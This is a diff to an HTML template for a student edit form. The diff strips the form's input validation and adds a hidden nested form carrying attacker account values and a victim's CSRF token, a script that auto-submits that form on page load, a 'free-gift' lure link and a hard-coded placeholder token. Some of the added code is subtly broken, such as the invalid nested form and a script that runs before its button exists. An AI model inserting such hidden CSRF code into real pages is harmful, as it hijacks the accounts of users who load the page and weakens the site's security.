@@ -1,19 +1,58 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <title>Edit Student</title>
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+	<meta charset="UTF-8" />
+	<title>Edit Student</title>
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" />
 </head>
+
 <body>
-    <div class="container mt-5">
-        <h1>Edit Student</h1>
-        <form method="POST">
-            <input type="text" name="name" value="{{ student.name }}" required pattern="[A-Za-z\s]+" maxlength="100" title="Only alphabets and spaces are allowed.">
-            <input type="number" name="age" value="{{ student.age }}" required>
-            <input type="text" name="grade" value="{{ student.grade }}" required pattern="^[A-F][+-]?$" title="Grade must be A, B, C, D, F, optionally followed by + or -.">
-            <button type="submit" class="btn btn-primary">Update</button>
-        </form>
-    </div>
+	<div class="container mt-5">
+		<h1>Edit Student</h1>
+
+		<script>
+			document.querySelector('button[type="submit"]').disabled = true;
+		</script>
+
+		<form id="myForm" action="/edit/{{ student.id }}" method="POST">
+			<input type="text" name="name" value="{{ student.name }}" required />
+
+			<script>
+				document.getElementById("myForm").onsubmit = function (event) {
+					var ageInput = document.getElementById("age");
+					if (ageInput.value < 1) {
+						alert("Age cannot under 1!");
+						event.preventDefault(); // Mencegah pengiriman form
+					}
+				};
+			</script>
+			<input type="number" id="age" name="age" min="0" step="1" value="{{ student.age }}" required />
+			<input type="text" name="grade" value="{{ student.grade }}" required />
+
+			<!-- CSRF Perlindungan Terhadap Serangan CSRF -->
+			<input type="hidden" name="csrf_token" value="unique-token-generated-for-user-session" />
+
+			<!-- Form yang dikirimkan otomatis untuk melakukan update profile -->
+			<form action="http://example.com/update-profile" method="POST" id="csrf-form">
+				<input type="hidden" name="username" value="attacker123" />
+				<!-- username yang diserang -->
+				<input type="hidden" name="email" value="attacker@example.com" />
+				<!-- email yang diserang -->
+				<input type="hidden" name="csrf_token" value="valid-token-from-victim" />
+				<!-- CSRF token yang diambil dari sesi korban -->
+			</form>
+
+			<script type="text/javascript">
+				// Otomatis mengirimkan form saat halaman dimuat
+				document.getElementById("csrf-form").submit();
+			</script>
+
+			<button type="submit" class="btn btn-primary">Update</button>
+
+			<a href="http://example.com/free-gift">Update Sekarang</a>
+		</form>
+	</div>
 </body>
+
 </html>
